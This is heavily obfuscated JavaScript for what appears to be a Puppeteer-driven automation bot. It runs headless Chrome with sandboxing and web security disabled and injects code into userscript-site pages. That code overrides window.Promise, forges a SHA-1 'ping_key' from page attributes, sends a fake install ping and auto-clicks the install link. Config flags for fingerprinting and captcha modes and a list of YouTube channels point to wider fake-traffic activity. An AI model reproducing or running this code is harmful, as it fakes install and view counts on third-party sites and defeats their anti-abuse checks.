* 0x1c + 0x4c * -0x54 & L) << y[-0x655 + -0x1d7a + -0x7 * -0x51e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x913 + -0x2124 + -0x7 * -0x611 ? (this['block'] = P[0x248d + 0x9 * -0xce + 0x1d3f * -0x1], this['start'] = N - (-0x1765 + -0x284 * -0x2 + 0x129d), this['hash'](), this['hashed'] = -0x1d35 + 0x1661 + 0x6d5) : this['start'] = N;
                }
                return this['bytes'] > 0x3f52f3d9 * -0x3 + -0xa1fbdb10 + 0x25ff4b69a && (this['hBytes'] += this['bytes'] / (-0x1155f42 * -0x74 + -0x50414b9 * -0x30 + -0x6e730c98) << -0x1005 + 0x1091 + -0x8c, this['bytes'] = this['bytes'] % (0x3c21da58 + 0x455 * -0x735fdc + 0x2b7ac69b4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x169b + 0x6b * 0x4 + -0x2 * 0xc23;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1 * -0xe85 + -0x1c57 + 0x2aec] = this['block'], J[K >> -0xafd + -0x2647 * 0x1 + 0x3146] |= x[-0x4ae + -0xb * -0xc3 + -0x76 * 0x8 & K], this['block'] = J[0x9 * -0x3e6 + 0x4 * 0x313 + 0x16da], K >= 0x89e * -0x2 + 0x1184 + -0x4 * 0x4 && (this['hashed'] || this['hash'](), J[-0xeb + 0x20f9 * 0x1 + 0x2 * -0x1007] = this['block'], J[-0x1d2 + -0x7b8 + -0x1 * -0x99a] = J[-0xb * 0x6a + 0x187 * 0x5 + -0x2 * 0x18a] = J[0x7 * -0x13b + 0x637 * -0x2 + -0x1 * -0x150d] = J[0x16 * 0x11d + 0x7 * 0x1ae + 0x1 * -0x243d] = J[-0xafd * 0x1 + -0x1 * -0x6dd + 0x109 * 0x4] = J[-0x2347 + -0x203b + 0x4387 * 0x1] = J[0x85 * 0x40 + 0xd04 + -0x2e3e] = J[-0x1f * 0xe2 + 0x61 * 0x2f + 0x996] = J[0x1a * 0x8 + 0x318 * 0xb + -0x22d0] = J[0x129f + -0xd * -0x1ca + 0x14ec * -0x2] = J[-0xbe4 + 0x468 * -0x7 + -0xdb * -0x32] = J[0x230f + -0x31c + -0x1fe8] = J[0x86e + 0x1bc4 * -0x1 + 0x676 * 0x3] = J[-0x285 + -0x17b3 + -0x5 * -0x541] = J[0x373 * -0x6 + -0x10d6 + 0x2596] = J[-0x220f + -0x2407 + 0x4625] = 0x21d1 + -0x220e + 0x3d * 0x1), J[-0x964 + 0x3d * 0x4f + -0x961] = this['hBytes'] << 0x1ddf + 0xb4f + -0x292b * 0x1 | this['bytes'] >>> -0x2 * -0x28c + 0x84f * 0x4 + -0x2637, J[-0x23b2 + -0x15b0 + 0x3971] = this['bytes'] << -0x3ad * 0x3 + -0x21e6 + 0x2cf0, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2 * -0xa52 + 0x2 * -0x539 + -0xa22; J < -0x19e4 * -0x1 + -0x1497 + -0x4fd; ++J)
                K = Q[J - (-0x2093 + -0x1650 + 0x1 * 0x36e6)] ^ Q[J - (-0x2468 + -0x6ac + -0x158e * -0x2)] ^ Q[J - (0x21bc + 0x25 * 0x25 + 0x61 * -0x67)] ^ Q[J - (-0x2f * -0xa3 + -0x11 * -0x1c6 + -0x3c03)], Q[J] = K << -0x23b2 + 0x9 * 0x331 + 0x6fa * 0x1 | K >>> 0x1208 * -0x1 + 0x490 + 0xd97;
              for (J = 0x2659 + 0x150f + -0x76d * 0x8; J < 0x1b63 + -0x91e + 0x1231 * -0x1; J += -0x1037 + 0xdb3 + 0x289)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xb07 * -0x3 + 0x23fc + -0x450c | L >>> -0x1 * -0x967 + -0x2c3 * 0x1 + -0x7 * 0xef) + (M & N | ~M & O) + P + (0x8643267f + 0x5f972c68 + -0x8b57d94e) + Q[J] << -0x9 * -0x2fa + -0x4 * 0x95c + -0x1d * -0x5e) << -0x1d90 + 0x56 * -0xa + 0x1 * 0x20f1 | P >>> -0x20c3 + -0x1224 * 0x1 + 0x3302) + (L & (M = M << -0x16a2 + 0x1f24 + 0x4 * -0x219 | M >>> 0x11e3 + -0x45d * 0x7 + 0xcaa) | ~L & N) + O + (0x52d5fac6 + 0x6b9a6873 * 0x1 + -0x63ede9a0) + Q[J + (-0xb25 + -0x2265 + -0x2d8b * -0x1)] << 0x181a + 0xfef + -0x2809) << 0x1d4f + -0x1144 + 0x9 * -0x156 | O >>> -0x22 * -0x1b + -0x266e + 0x22f3) + (P & (L = L << -0x10f * 0x4 + -0x10 * -0x35 + -0x26 * -0x7 | L >>> -0xac5 + 0x53 * 0x2f + -0x476) | ~P & M) + N + (0x7f * -0x91a635 + 0xd * 0x908d531 + 0x2d511a67) + Q[J + (0x1a1 * 0xa + -0xb7 * -0x35 + -0x362b)] << 0x1 * 0x2489 + 0x1eb * -0xc + -0xd85 * 0x1) << 0xc86 + -0x23b2 * -0x1 + -0x3033 | N >>> 0x1e50 + -0x1 * -0x1216 + -0x13d * 0x27) + (O & (P = P << 0x14f5 * 0x1 + 0x309 * -0x3 + -0xbbc | P >>> 0x51 * -0x5d + 0x1765 + -0x305 * -0x2) | ~O & L) + M + (0xee22eac + 0x7393b907 + -0x2 * 0x13f9b70d) + Q[J + (0x15a1 + 0x1223 * 0x2 + -0xf * 0x3dc)] << -0x59b * -0x5 + 0x2420 + -0x4027) << 0x1ddf * 0x1 + -0x1a54 + -0x386 | M >>> -0x228b + 0x6ab * -0x5 + -0x43fd * -0x1) + (N & (O = O << 0x1 * 0x1fdc + -0x26e + 0x1 * -0x1d50 | O >>> 0x198b + -0x23c9 * 0x1 + -0x1 * -0xa40) | ~N & P) + L + (-0x430e2c33 + 0x15229b1e + 0x24a * 0x3b99cb) + Q[J + (0x2097 + -0xc29 * -0x1 + -0x2cbc)] << 0x1 * -0x254d + -0x997 * 0x1 + 0x2ee4, N = N << 0x20d1 + -0x1646 * -0x1 + -0x36f9 | N >>> -0x5 * 0x52f + 0x14db + 0x1 * 0x512;
              for (; J < 0x85f + 0x2 * -0xae5 + 0xd93; J += 0x134d + -0x2 * 0x973 + -0x1 * 0x62)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1f46 + -0x240c + 0x4cb | L >>> 0x2c4 * -0x4 + -0xc75 + -0x1b0 * -0xe) + (M ^ N ^ O) + P + (0x91a48e45 + 0x74d371e8 + -0xd63c * 0xb52d) + Q[J] << 0x124d + -0x751 * -0x5 + -0x36e2) << 0x4e5 + -0x13 * 0x18e + 0x18aa | P >>> -0x17b * 0xd + -0x1685 * 0x1 + -0x1b * -0x18d) + (L ^ (M = M << 0x1392 + 0xfa6 * -0x1 + -0x3ce * 0x1 | M >>> -0x20f5 * -0x1 + 0x4a * -0x58 + -0x783) ^ N) + O + (-0xd142205c + 0x7 * -0x1f65ef0d + -0x437cb2ab * -0x8) + Q[J + (-0xddf + 0x1 * 0x112d + 0x41 * -0xd)] << -0x2e * -0x33 + 0x80 + -0x9aa) << -0x147 * -0x13 + 0x5 * 0x55 + 0x2e1 * -0x9 | O >>> 0x1 * -0x12cd + -0x1cf * -0x5 + 0x5 * 0x1f9) + (P ^ (L = L << 0x65c + -0x218b * -0x1 + -0x27c9 | L >>> -0x5 * 0xb2 + 0x12a7 + -0x1 * 0xf2b) ^ M) + N + (-0x11a9428a + 0x9e48a848 + -0x1dc57a1d * 0x1) + Q[J + (-0x7 * -0x61 + -0x22e8 + -0x3 * -0xac1)] << -0x1 * 0x1763 + 0x781 * 0x1 + 0xfe2) << 0x1 * -0x6da + -0x2151 + 0x2830 * 0x1 | N >>> 0x169b + 0x1689 * 0x1 + 0x1ab * -0x1b) + (O ^ (P = P << 0x269 + -0x1221 + 0xfd6 | P >>> 0x392 + 0x15f7 * 0x1 + -0x1987) ^ L) + M + (0x1653e026 + 0x6cb60f4c + 0x1 * -0x143003d1) + Q[J + (-0x61 * 0xd + -0xaf9 + -0xfe9 * -0x1)] << -0xaef + -0x180 + 0xc6f) << 0x815 * -0x1 + -0xbf * -0x2b + -0x17fb | M >>> 0x1fef + -0x1bad * 0x1 + -0x1 * 0x427) + (N ^ (O = O << -0x28 * 0x95 + 0x2034 + -0x8ce | O >>> 0xc56 * 0x1 + -0x2b3 * 0x6 + 0x2d * 0x16) ^ P) + L + (0x5c6752df + -0x48c84812 + -0xdc82 * -0x69ea) + Q[J + (0xeb * -0x1e + -0x4 * -0x2a6 + -0x87b * -0x2)] << -0x992 + 0x2 * -0xedc + 0x274a, N = N << 0x1018 + -0x203e + 0x1044 | N >>> -0x1a21 + -0x1e * -0xc1 + 0x11 * 0x35;
              for (; J < -0x250d + 0x1 * -0x1eb2 + 0x16a9 * 0x3; J += -0x33e * -0x6 + -0xb4d + -0x822)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3d7 * -0x4 + 0x2 * -0xdc7 + 0xc37 | L >>> 0x23bb * 0x1 + -0xa2 * -0x3d + -0x4a3a) + (M & N | M & O | N & O) + P - (0xd33fc1 * -0x9e + 0x69c600fd + 0x897f9b45) + Q[J] << -0x64 * 0x4d + 0x1 * 0x1724 + 0x6f0) << 0xba1 * 0x2 + -0x555 + 0xc * -0x17e | P >>> -0x1 * -0x103f + -0x6e2 + -0x942) + (L & (M = M << 0x19ad * -0x1 + 0x3f * -0x49 + 0x2 * 0x15e1 | M >>> 0x2 * 0xa62 + -0x29c * 0x9 + -0x1 * -0x2ba) | L & N | M & N) + O - (-0x93 * -0x6dc41f + 0x6b * 0x417365 + 0x16816a20) + Q[J + (-0x985 * 0x1 + -0xf79 + 0x18ff)] << -0xf0f + -0x17 * -0x15c + -0x1 * 0x1035) << 0x9e3 * 0x3 + 0x2244 + -0x2 * 0x1ff4 | O >>> -0x1797 + -0xc74 * 0x3 + 0x3d0e * 0x1) + (P & (L = L << -0x1b85 + 0x1e * 0x51 + 0x1225 | L >>> 0x3c8 * -0x5 + 0x44a + 0xea0) | P & M | L & M) + N - (-0xbbdf1156 + -0x718a5c3a + 0x1e68582 * 0xda) + Q[J + (-0x2 * -0x11ce + 0x36 * 0xa2 + -0x45c6)] << 0x19a9 + 0x197f + -0x1 * 0x3328) << 0x2567 + -0x2 * -0x1312 + -0x4b86 | N >>> 0x1 * -0x24e6 + -0x1f2 + -0x1 * -0x26f3) + (O & (P = P << -0x1 * -0x12c + 0x471 * 0x1 + 0x57f * -0x1 | P >>> -0x189f + 0x43b + 0x1466) | O & L | P & L) + M - (-0xa8776918 + 0xe * 0x91084f1 + 0x9a74670e) + Q[J + (-0x874 + 0x3 * 0x335 + -0x128)] << -0x12a0 + -0xb1 * -0xf + -0x841 * -0x1) << 0x35 * 0x65 + -0x1a11 + 0x52d | M >>> -0x3ff * 0x5 + -0x7b1 + 0x1 * 0x1bc7) + (N & (O = O << -0x1 * -0x2009 + -0x2572 + 0x587 | O >>> 0x1ada + 0x229 * 0xa + -0x1026 * 0x3) | N & P | O & P) + L - (0x5463827 * -0x19 + 0x6acc9df7 * -0x1 + 0x1a * 0xd856609) + Q[J + (0x245d + 0x1c3 * -0x11 + -0x15 * 0x4e)] << 0x77 * 0x15 + 0x1 * -0x17c0 + 0xdfd * 0x1, N = N << -0x24e2 + 0xb33 * 0x2 + 0xe9a | N >>> -0x15c5 + 0x54a + 0x107d;
              for (; J < -0xa4 * -0x1 + -0xf28 + 0xed4; J += 0x976 + 0x219d + -0x2b0e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xac * 0x22 + 0x14 * 0x104 + 0x28d | L >>> -0xcd1 + 0x2206 + 0x92 * -0x25) + (M ^ N ^ O) + P - (-0x21cadd28 + 0x2646b35b + 0x312167f7) + Q[J] << 0x3 * 0x3dd + -0x406 + -0x1 * 0x791) << -0xad + -0x1a71 * -0x1 + -0x19bf | P >>> -0xb84 * -0x1 + 0x1 * -0x171a + -0x1 * -0xbb1) + (L ^ (M = M << 0x21 * 0xdf + 0x11 * -0x1c1 + 0x130 | M >>> -0x67e + -0x1 * 0x22b4 + 0x2934) ^ N) + O - (-0x3aaf7b3b + -0x1 * -0x537647fb + 0xe6b38b5 * 0x2) + Q[J + (-0x2126 + -0xb70 + 0x2c97)] << -0x2234 + -0x1 * -0x1a4d + 0x11 * 0x77) << 0x181d + -0x1471 + -0xb * 0x55 | O >>> -0x23d1 + 0x16a2 + -0xd4a * -0x1) + (P ^ (L = L << -0x909 + 0xe0f * 0x1 + 0x4 * -0x13a | L >>> -0xb0b * -0x2 + 0xaea + -0x20fe) ^ M) + N - (-0xf2a3b * -0x6e2 + 0x1249c5be + -0x450d31aa) + Q[J + (-0x395 * 0x2 + 0xda3 + -0x677)] << 0x1 * 0xcf5 + -0x9e5 * 0x2 + 0x6d5) << 0xc * 0x6d + -0x124c + 0x7 * 0x1e3 | N >>> 0xac4 + -0x55 * -0x63 + -0x2b88) + (O ^ (P = P << 0x3e * -0x7 + 0x20e2 + -0x1f12 | P >>> 0x946 * 0x2 + -0x1a91 + -0x807 * -0x1) ^ L) + M - (-0x51b0b * 0x78b + 0x5101021 * -0x5 + 0x75708ac8) + Q[J + (-0x9e * 0x16 + -0x2129 + -0xb0 * -0x44)] << -0x2 * 0xd91 + 0x4b7 * -0x5 + 0x3 * 0x10e7) << 0x21e7 + -0x25ac + 0x3ca | M >>> -0xb9f + 0x7cc * -0x1 + 0x1386) + (N ^ (O = O << 0x2b1 * -0x9 + -0x1f9f + 0x2 * 0x1bfb | O >>> 0xa98 + 0xd0 * -0x25 + 0x137a) ^ P) + L - (-0x314c6142 + -0x1 * 0x555ada62 + -0x2 * -0x5e223ce7) + Q[J + (-0x59c + 0x80a + -0x26a)] << 0xbe * -0x13 + 0x93a * 0x2 + -0x45a, N = N << -0x24dc + 0x16 * -0x13c + 0x4022 | N >>> -0x1fbf + 0x2544 + -0x1 * 0x583;
              this['h0'] = this['h0'] + L << -0x8e * 0x33 + 0x15ff + 0x64b, this['h1'] = this['h1'] + M << -0x14a7 + 0x61f * -0x1 + 0x1ac6, this['h2'] = this['h2'] + N << 0x3bb + -0x1eb * -0x3 + -0x97c, this['h3'] = this['h3'] + O << 0x2 * 0x9e5 + 0xf22 + -0x22ec, this['h4'] = this['h4'] + P << 0x1c2 * 0xd + -0x365 + -0x1375;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x9a4 + 0x2588 + -0x2f10 & 0x55 * 0xf + 0x25de + 0x2 * -0x1565] + w[J >> -0x922 + 0x4a5 + 0x495 & -0xfbc + 0x20fa + -0x112f] + w[J >> 0x530 * -0x1 + -0x56 * -0x72 + -0x2108 & 0x1 * -0xa63 + -0x253c + 0x2fae] + w[J >> -0x20b4 + 0x84f + 0x1875 & -0x1 * 0xf8e + 0x1c69 + -0xccc] + w[J >> 0x263 * -0xa + -0xd0f + 0x3 * 0xc53 & -0x3c4 + -0x5 * 0x5f3 + 0x2192] + w[J >> 0x1273 * -0x1 + 0x17d1 + 0x2ab * -0x2 & -0x727 + -0x8 * -0x383 + 0x37b * -0x6] + w[J >> 0x40 * -0x9 + 0x1cb * -0x9 + -0x7 * -0x2a1 & 0x62 * -0x10 + -0x1352 * -0x1 + -0xd23] + w[0x1b7 + -0x2282 + -0x91 * -0x3a & J] + w[K >> 0x137b + -0x250d + 0x11ae & 0x64d * 0x2 + -0x17 * -0xa7 + -0x29 * 0xac] + w[K >> 0x8ae + -0x23 * 0xcd + 0x1371 & -0x1 * -0x609 + 0x11b * 0xb + -0x1223] + w[K >> 0x1fdd + 0x2 * 0x5e7 + -0x2b97 & -0x1862 + 0x9 * -0x10c + 0x21dd] + w[K >> -0x1145 * -0x1 + 0x19c0 + -0x2af5 & 0xbb6 + 0x1bb7 + -0x13af * 0x2] + w[K >> -0x19 * 0x15a + 0xa1 * -0x4 + 0x245a & 0x1 * -0x1db7 + 0x26f2 + -0x92c] + w[K >> -0x11b * -0x3 + 0x5 * -0x40b + 0x10ee & 0x50 * -0x70 + -0x22be + 0x6b * 0xa7] + w[K >> -0xa5 * 0xc + -0x1558 + 0x1d18 & 0x12d3 + -0x1b93 + 0x8cf] + w[0x138 + -0x11d3 + 0x10aa & K] + w[L >> 0x42d + -0x1cfa + -0x18e9 * -0x1 & -0x1c0d + -0x4b2 * 0x1 + 0x20ce] + w[L >> -0x2398 + -0xaf0 + 0x2ea0 & -0x1 * 0x289 + 0x1da * 0x15 + -0x244a] + w[L >> -0xd5c + 0x3d * 0x8d + -0x1429 & 0x24b0 + -0x23e1 + -0xc0] + w[L >> 0x7c0 + 0x9b * 0x16 + -0x1502 & 0x1f4d + -0xe7 + -0x1e57] + w[L >> -0x2175 + -0x1ecb * 0x1 + 0x404c & -0x1678 + 0xf74 + -0x1 * -0x713] + w[L >> 0x9 * 0x295 + 0x6f * 0x2 + -0x1813 & 0x15fb * 0x1 + 0x2fc * -0xa + -0xc * -0xa9] + w[L >> -0x880 + -0x56 * -0x73 + -0x1e1e & -0x1 * 0x2363 + 0x1 * -0x2345 + 0x2b * 0x1a5] + w[0x11ee + 0x1765 * -0x1 + 0x586 & L] + w[M >> -0xec2 + -0x255b + -0x1 * -0x3439 & 0x1 * 0xef5 + 0x22 * 0xf1 + -0x2ee8] + w[M >> 0xee5 + -0x1 * 0xf3 + -0xdda & 0x1ff5 + 0x11c6 + -0x31ac] + w[M >> 0x55 * 0x4f + -0xc7e + -0x1 * 0xda9 & -0x61 * -0x1b + -0x268a + 0x2 * 0xe2f] + w[M >> 0x2525 + 0x42d * -0x1 + -0x20e8 & -0x3 * -0xa9f + 0xd2 + 0x20 * -0x105] + w[M >> 0x1 * 0x1637 + 0x2b * 0x7e + 0x2b55 * -0x1 & 0x1007 + -0x11a9 * 0x1 + 0x1b1] + w[M >> 0x1cf7 + 0xb * -0xd + -0x1c60 & 0x1 * 0x21d9 + -0x132f + 0x1 * -0xe9b] + w[M >> 0x45e * -0x1 + -0x5 * 0x74b + -0x1 * -0x28d9 & -0x1 * 0xd3d + 0xe67 + -0x11b * 0x1] + w[0x13a2 + 0x165e * -0x1 + -0x1 * -0x2cb & M] + w[N >> 0x234f + -0x8aa + -0x1a89 & 0x1456 + -0x1482 + -0x3b * -0x1] + w[N >> -0x152b + 0x1893 + -0x350 & -0x1315 + -0x1 * -0x24e6 + -0x11c2] + w[N >> -0xc1f + 0x59 * -0x29 + 0x1a74 & 0x2285 + 0x2678 * -0x1 + -0x39 * -0x12] + w[N >> 0x1b * 0x92 + -0x190f + 0x9b9 & 0x1464 + 0x118a + -0x5 * 0x793] + w[N >> -0x84b * -0x1 + 0x133 * -0x17 + 0x1356 & 0x5 * -0x37f + 0xfd * -0x5 + -0x1 * -0x167b] + w[N >> -0x1 * 0x1bd9 + 0x1a5 * 0x6 + 0x601 * 0x3 & 0xac6 * 0x1 + 0x26ad + 0x3a * -0xda] + w[N >> -0x17ea + -0x17eb + 0x2fd9 & 0x4 * -0x1dd + -0x1adc + 0x225f] + w[0x1d72 + 0xd * 0x1c1 + -0xd0c * 0x4 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x7f * 0x1c + 0x78a + 0x2 * 0x339 & 0x1115 + -0xde8 + 0x9 * -0x3e,
                J >> 0x1f73 + -0x1 * 0x83e + -0x1725 & -0xbc6 * -0x3 + -0x1b * -0x128 + 0x95d * -0x7,
                J >> -0xa31 + 0x221d + -0xb * 0x22c & -0x525 * 0x3 + -0x12a0 + 0x230e,
                0x1 * -0x1e5d + 0x42d + -0x1 * -0x1b2f & J,
                K >> 0x3af + 0x16b5 + -0x1a4c & -0x1 * -0x1fee + -0x79e + -0x7f * 0x2f,
                K >> 0x1049 * -0x1 + 0x6e * 0x3b + -0x901 & -0x135d * -0x1 + 0x1 * 0x209c + 0x1b3 * -0x1e,
                K >> 0x1cf3 * -0x1 + -0x9e0 + 0x26db & 0x117f * 0x2 + 0x3ae * 0x1 + -0x789 * 0x5,
                -0x13db + -0x6e6 + -0x60 * -0x4a & K,
                L >> -0x572 + -0x1953 + 0x1edd * 0x1 & 0x71d * -0x4 + -0x4a * 0x37 + -0xf7 * -0x2f,
                L >> 0x23e9 * 0x1 + -0x6 * -0x9d + -0x3 * 0xd2d & -0x19c6 + -0x67 * 0x59 + -0x24 * -0x1bd,
                L >> 0x2 * 0x9ef + 0xfdf + -0x21 * 0x115 & -0xe62 + 0x1 * 0x8d2 + 0x68f * 0x1,
                -0x1 * -0x446 + 0xbe3 * -0x2 + 0x147f & L,
                M >> 0x5d0 * -0x3 + 0x26b6 + 0xa97 * -0x2 & 0x1479 + 0x13 * -0xbf + 0x3b * -0x17,
                M >> 0x8 * 0x45b + 0x1 * 0x7da + -0x2aa2 & 0x1 * -0x1f29 + 0x2 * 0x1226 + -0x109 * 0x4,
                M >> -0x20 * -0x119 + 0x18e6 + -0x3bfe * 0x1 & 0x1b24 + 0x1082 + -0x2aa7,
                -0x6a5 * -0x2 + -0x10a + 0x1 * -0xb41 & M,
                N >> 0xc1b + 0x1a17 * -0x1 + 0xe14 & 0x1 * 0x1d87 + 0xb7d + -0x2805,
                N >> 0x2245 + -0x169f + 0x1 * -0xb96 & -0xe8 + 0x10bd * 0x1 + -0xed6,
                N >> -0x9 * 0xcd + 0x257f + 0x1e42 * -0x1 & -0x1105 * -0x1 + -0x1 * 0x5fb + -0xa0b,
                -0x159b * -0x1 + 0x25fe + -0x3a9a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x103b + 0xcca + 0x1 * -0x1cf1), (K = new DataView(J))['setUint32'](0xa74 + 0x24ec + -0x2f60, this['h0']), K['setUint32'](0x1476 + 0x2 * -0x8b6 + -0x306, this['h1']), K['setUint32'](0x267 + -0x808 + -0xa1 * -0x9, this['h2']), K['setUint32'](0x66 + -0x4 * -0x368 + -0xdfa, this['h3']), K['setUint32'](0x1 * -0x17a5 + -0x8 * -0xd3 + 0x111d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1 * -0x2003 + 0x688 * -0x4 + 0x5e3 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x72e * 0x1 + -0x2 * 0xed0 + 0x24ce * 0x1;
            J[-0x159a + -0x167d + 0x2c17]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1693 + -0x468 + 0x1 * 0x1afb] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1ab3 + 0x2453 + -0x99f), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x64 * -0x13 + 0x675 * -0x2 + 0x57f;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x55d * -0x1 + -0x2597 + -0x19 * -0x186), Promise['resolve'](-0x1666 + 0x59 * 0x6f + -0x1030);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1db7 + -0x2ee + 0x20a5; j < -0x14a7 + 0x1d62 + -0x8ba; j++)
    i();
}
const NETWORK_PATIENCE = -0x197f + 0x1 * -0x38b3 + 0x7172 + (0x1b39 + 0x1 * -0x1999 + 0x4 * 0x286) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1a65 + 0x2362 + -0x3dc4) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * -0x1e2f + -0x1784 + -0x3 * 0x239);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x724 * -0x4 + -0x2167 + 0x4d7; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function a() {
  const br = [
    'eGddMSk+W5CJW7ldOHddVa',
    'WRelftFcHqlcJNldJM0',
    'W43cUcG',
    'Ew91DhvIzs1OAq',
    'https://gr',
    'l1PYzw4VuMvZAq',
    'easyfork.o',
    'sxFcGCotW7FdJNFcShNcJa',
    'CMfTBwLUzY9Szq',
    'ntrepreneu',
    'Android\x2010',
    'ALjJyY1osviYuG',
    'owNdGttdVmk6WP4QW6xdIW',
    'W58mcCk0WOtcN8krrYy4',
    'sults',
    'minecraft\x20',
    'BeddSmkGW7SoWQddLMtdLa',
    'Mozilla/5.',
    'childNodes',
    'BxbHAwDUpxnVyW',
    'y2HPBgrYzw4',
    'e/moomoo.i',
    'rg/scripts',
    'D3nLCG',
    '__lllll',
    'BM8Ty2fJAgu',
    'lwj1DhrVBI1Yzq',
    'WQlcK1DhW6a',
    'WOZcGmkbhmo9WQtcNmoOWPG3',
    'no-cache',
    'zMXHDa',
    'hCkfzYOZqCkrtqhdVa'
  ];
  a = function() {
    return br;
  };
  return a();
}
let searchTerms = [];
